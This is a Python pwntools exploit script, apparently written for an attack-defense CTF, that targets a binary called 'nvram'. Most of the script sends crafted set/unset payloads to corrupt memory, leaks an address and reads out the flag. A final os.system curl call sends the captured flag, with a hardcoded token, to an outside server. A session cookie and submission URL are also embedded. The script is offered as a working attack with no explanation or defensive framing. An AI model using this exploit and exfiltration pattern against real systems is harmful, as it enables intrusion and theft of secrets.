from pwn import *
import sys
#context.log_level = "debug"

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

p = 0
q = 0
if debug:
    p = process("./nvram")
    #libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
    p = remote(sys.argv[1],sys.argv[2])
    #libc = ELF("./libc-2.27.so")

def debugf():
    global p,q
    if debug:
        p = gdb.debug("./nvram","b *0x403747\nset follow-fork-mode child")

def bruteforce():
    p.sendlineafter("$ ","set \x18\x5b\x60 \x18\x5b\x60")
    p.sendlineafter("$ ","set "+"h"*0x10+" "+"A"*0x10)
    p.sendlineafter("$ ","unset \x18\x5b\x60")
    p.sendlineafter("$ ","unset "+"h"*0x10)
    p.sendlineafter("$ ","set "+"xhh "+"A"*0x18+"\x04\x08\x60"+"\xff"*5+p32(0x605b98))
    p.sendlineafter("$ ","get "+"\x01")
    strs = p.recv(4)
    addr = u32(strs)
    p.sendlineafter("$ ","set "+"xhh "+"A"*0x18+"\x04\x08\x60"+"\xff"*5+p32(addr+0x280))
    p.sendlineafter("$ ","credit "+"AAA")
    p.sendlineafter("$ ","get "+"\x01") 
    return p.recvline().strip("\n")

cookie = "PHPSESSID=fnmto7o4paibjkhpn3icvp828v"
url = "http://172.16.123.123/commapi/userspace/submitFlag"
token = "NAvGwfCAQz6WrWrk4XvjQSBE8QFe43ek8q24TbFtbM9TknM2CNXMkuT42TbuvYMu2kjdxU3AbGE"
def submit(flag):
	os.system('curl http://10.66.20.50:9000/submit_flag/ -d "flag={flag}&token={token}"'.format(flag = flag,token = token))


#context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
flag = bruteforce()
print flag
#raw_input()
submit(flag)
